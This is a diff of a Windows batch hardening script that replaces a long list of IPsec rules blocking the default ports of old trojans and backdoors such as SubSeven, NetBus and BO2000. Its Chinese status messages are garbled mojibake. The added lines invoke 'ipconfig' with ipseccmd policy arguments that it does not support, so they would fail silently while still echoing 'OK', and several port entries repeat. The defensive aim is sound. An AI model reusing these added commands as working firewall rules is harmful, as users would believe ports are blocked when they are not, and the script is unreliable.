+echo å…³é—­æœ¨é©¬WAY2.4é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OKï¼
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/9989" -f *+0:9989:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬InIkilleré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/19191" -f *+0:19191:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬å…°è‰²ç«ç„°é»˜è®¤å¼€æ”¾çš„telnetç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1029" -f *+0:1029:TCP -n BLOCK -x >nul
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/20168" -f *+0:20168:TCP -n BLOCK -x >nul
+echo å…³é—­lovegate è •è™«æ‰€å¼€æ”¾çš„ä¸¤ä¸ªåé—¨ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/23444" -f *+0:23444:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬ç½‘ç»œå…¬ç‰›é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/27374" -f *+0:27374:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬SUB7é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/30100" -f *+0:30100:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬NetSphereé»˜è®¤çš„æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/31337" -f *+0:31337:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬BO2000é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/45576" -f *+0:45576:TCP -n BLOCK -x >nul
+echo å…³é—­ä»£ç†è½¯ä»¶çš„æ§åˆ¶ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/50766" -f *+0:50766:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Schwindleré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/61466" -f *+0:61466:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Telecommandoé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
 
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/31338" -f *+0:31338:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíBack OrificeÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/8102" -f *+0:8102:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíÍøÂçÉñÍµÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2000" -f *+0:2000:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíºÚ¶´2000Ä¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/31339" -f *+0:31339:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíNetSpy DKÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2001" -f *+0:2001:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíºÚ¶´2001Ä¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/31666" -f *+0:31666:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíBOWhackÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/34324" -f *+0:34324:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíBigGluckÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7306" -f *+0:7306:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíÍøÂç¾«Áé3.0£¬netspy3.0Ä¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/40412" -f *+0:40412:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíThe SpyÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/40421" -f *+0:40421:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíMasters ParadiseÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/8011" -f *+0:8011:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾Âíwry£¬ÀµĞ¡×Ó£¬»ğ·ï»ËÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/40422" -f *+0:40422:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíMasters Paradise 1.xÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/23444" -f *+0:23444:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíÍøÂç¹«Å££¬netbullÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/40423" -f *+0:40423:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíMasters Paradise 2.xÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/23445" -f *+0:23445:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíÍøÂç¹«Å££¬netbullÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/40426" -f *+0:40426:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíMasters Paradise 3.xÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/50505" -f *+0:50505:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíSockets de TroieÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/27374" -f *+0:27374:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíSub Seven 2.0+£¬77£¬¶«·½Ä§ÑÛÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/50766" -f *+0:50766:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíForeÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/53001" -f *+0:53001:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíRemote Windows ShutdownÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/61466" -f *+0:61466:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíTelecommandoÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/121" -f *+0:121:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíBO jammerkillahVÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/666" -f *+0:666:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíSatanz BackdoorÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/65000" -f *+0:65000:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíDevilÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1001" -f *+0:1001:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíSilencerÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6400" -f *+0:6400:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíThe tHingÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1600" -f *+0:1600:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíShivka-BurkaÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/12346" -f *+0:12346:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíNetBus 1.xÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1807" -f *+0:1807:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíSpySenderÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/20034" -f *+0:20034:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíNetBus ProÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1981" -f *+0:1981:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíShockraveÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1243" -f *+0:1243:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíSubSevenÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1001" -f *+0:1001:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíWebExÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/30100" -f *+0:30100:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíNetSphereÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1011" -f *+0:1011:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíDoly TrojanÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1001" -f *+0:1001:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíSilencerÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1170" -f *+0:1170:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíPsyber Stream ServerÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/20000" -f *+0:20000:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíMilleniumÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1234" -f *+0:1234:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíUltors TrojanÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/65000" -f *+0:65000:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíDevil 1.03Ä¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1245" -f *+0:1245:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíVooDoo DollÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7306" -f *+0:7306:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíNetMonitorÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1492" -f *+0:1492:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíFTP99CMPÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1170" -f *+0:1170:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíStreaming Audio TrojanÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1999" -f *+0:1999:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíBackDoorÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/30303" -f *+0:30303:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíSocket23Ä¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2001" -f *+0:2001:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíTrojan CowÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6969" -f *+0:6969:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíGatecrasherÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2023" -f *+0:2023:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíRipperÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/61466" -f *+0:61466:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíTelecommandoÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2115" -f *+0:2115:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíBugsÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/12076" -f *+0:12076:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíGjamerÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2140" -f *+0:2140:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíDeep ThroatÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4950" -f *+0:4950:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíIcqTrojenÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2140" -f *+0:2140:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíThe InvasorÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/16969" -f *+0:16969:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíPriotrityÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2801" -f *+0:2801:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíPhineas PhuckerÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1245" -f *+0:1245:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíVodooÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/30129" -f *+0:30129:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíMasters ParadiseÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5742" -f *+0:5742:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíWincrashÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/3700" -f *+0:3700:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíPortal of DoomÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2583" -f *+0:2583:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíWincrash2Ä¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4092" -f *+0:4092:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíWinCrashÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1033" -f *+0:1033:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíNetspyÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4590" -f *+0:4590:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíICQTrojanÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1981" -f *+0:1981:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíShockRaveÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5000" -f *+0:5000:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíSockets de TroieÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/555" -f *+0:555:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíStealth SpyÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5001" -f *+0:5001:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíSockets de Troie 1.xÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2023" -f *+0:2023:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíPass RipperÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5321" -f *+0:5321:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíFirehotckerÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/666" -f *+0:666:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíAttack FTPÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5400" -f *+0:5400:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíBlade RunnerÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/21554" -f *+0:21554:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíGirlFriendÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5401" -f *+0:5401:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíBlade Runner 1.xÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/50766" -f *+0:50766:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíFore SchwindlerÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5402" -f *+0:5402:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíBlade Runner 2.xÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/34324" -f *+0:34324:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíTiny Telnet ServerÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5569" -f *+0:5569:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíRobo-HackÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/30999" -f *+0:30999:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíKuangÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6670" -f *+0:6670:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíDeepThroatÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/11000" -f *+0:11000:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíSenna Spy TrojansÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6771" -f *+0:6771:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíDeepThroatÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/23456" -f *+0:23456:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíWhackJobÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6969" -f *+0:6969:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíGateCrasherÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/555" -f *+0:555:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíPhase0Ä¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6969" -f *+0:6969:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíPriorityÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5400" -f *+0:5400:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíBlade RunnerÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7000" -f *+0:7000:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíRemote GrabÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4950" -f *+0:4950:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíIcqTrojanÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7300" -f *+0:7300:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíNetMonitorÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9989" -f *+0:9989:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíInIkillerÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7301" -f *+0:7301:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíNetMonitor 1.xÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9872" -f *+0:9872:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíPortal Of DoomÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7306" -f *+0:7306:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíNetMonitor 2.xÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/11223" -f *+0:11223:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíProgenic TrojanÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7307" -f *+0:7307:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíNetMonitor 3.xÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1999" -f *+0:1999:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíBackDoorÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5800" -f *+0:5800:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÔ¶³Ì¿ØÖÆÈí¼şVNCÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5900" -f *+0:5900:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÔ¶³Ì¿ØÖÆÈí¼şVNCÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/22222" -f *+0:22222:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíProsiak 0.47Ä¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7626" -f *+0:7626:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾Âí±ùºÓÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4444" -f *+0:4444:TCP -n BLOCK -x >nul
